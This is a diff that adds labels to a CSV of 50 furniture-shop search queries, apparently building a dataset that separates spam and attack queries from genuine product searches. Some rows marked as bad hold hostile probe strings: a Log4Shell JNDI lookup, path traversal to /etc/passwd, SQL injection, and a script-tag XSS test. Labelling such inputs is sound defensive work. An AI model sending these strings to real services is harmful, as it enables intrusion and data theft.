@@ -1,51 +1,51 @@
 id,query,label
-1,xk9qz7vplm,
-2,${jndi:ldap://x.example/a},
-3,velvet accent chair teal,
-4,lark manor area rug 8x10,
-5,../../etc/passwd,
-6,linen curtains 96 inch,
-7,aaaaaaaaaaaaaaaaaaaa,
-8,1; DROP TABLE users;--,
-9,ikea kallax shelf,
-10,union jack rug,
-11,cofee table round marble,
-12,mid century walnut sideboard,
-13,drop leaf table,
-14,rattan pendant light,
-15,"36"" bathroom vanity",
-16,wf-2049x desk,
-17,king size headboard tufted,
-18,ashley furniture recliner,
-19,outdoor patio umbrella 9 ft,
-20,asdfghjkl qwerty zxcv,
-21,corner computer desk l shape,
-22,loveseat/recliner combo,
-23,counter height stools set of 2,
-24,wall mirror gold frame,
-25,qqqqwwwweeee 8374651,
-26,kids bunk bed with storage,
-27,entryway bench with shoe storage,
-28,<script>alert(1)</script>,
-29,%00%00%00%27%22,
-30,' OR '1'='1' --,
-31,tall dresser 6 drawer white,
-32,red barrel studio loveseat,
-33,null bed frame,
-34,72 inch tv console,
-35,select comfort mattress,
-36,nightstand with usb port,
-37,desk chair ergonomic mesh,
-38,bar cart gold,
-39,SKU000124,
-40,ottoman,
-41,"shower curtain, farmhouse",
-42,queen platform bed frame upholstered,
-43,SKU000123,
-44,buy cheap followers click here www.promo-deals.biz,
-45,floating shelves set,
-46,farmhouse dining table for 8,
-47,sofa sofa sofa sofa sofa sofa sofa,
-48,bookcase 5 shelf oak,
-49,best casino bonus free spins sofa,
-50,sectional sofa w/ chaise,
+1,xk9qz7vplm,1
+2,${jndi:ldap://x.example/a},1
+3,velvet accent chair teal,0
+4,lark manor area rug 8x10,0
+5,../../etc/passwd,1
+6,linen curtains 96 inch,0
+7,aaaaaaaaaaaaaaaaaaaa,1
+8,1; DROP TABLE users;--,1
+9,ikea kallax shelf,0
+10,union jack rug,0
+11,cofee table round marble,0
+12,mid century walnut sideboard,0
+13,drop leaf table,0
+14,rattan pendant light,0
+15,"36"" bathroom vanity",0
+16,wf-2049x desk,0
+17,king size headboard tufted,0
+18,ashley furniture recliner,0
+19,outdoor patio umbrella 9 ft,0
+20,asdfghjkl qwerty zxcv,1
+21,corner computer desk l shape,0
+22,loveseat/recliner combo,0
+23,counter height stools set of 2,0
+24,wall mirror gold frame,0
+25,qqqqwwwweeee 8374651,1
+26,kids bunk bed with storage,0
+27,entryway bench with shoe storage,0
+28,<script>alert(1)</script>,1
+29,%00%00%00%27%22,1
+30,' OR '1'='1' --,1
+31,tall dresser 6 drawer white,0
+32,red barrel studio loveseat,0
+33,null bed frame,0
+34,72 inch tv console,0
+35,select comfort mattress,0
+36,nightstand with usb port,0
+37,desk chair ergonomic mesh,0
+38,bar cart gold,0
+39,SKU000124,0
+40,ottoman,0
+41,"shower curtain, farmhouse",0
+42,queen platform bed frame upholstered,0
+43,SKU000123,0
+44,buy cheap followers click here www.promo-deals.biz,1
+45,floating shelves set,0
+46,farmhouse dining table for 8,0
+47,sofa sofa sofa sofa sofa sofa sofa,1
+48,bookcase 5 shelf oak,0
+49,best casino bonus free spins sofa,1
+50,sectional sofa w/ chaise,0
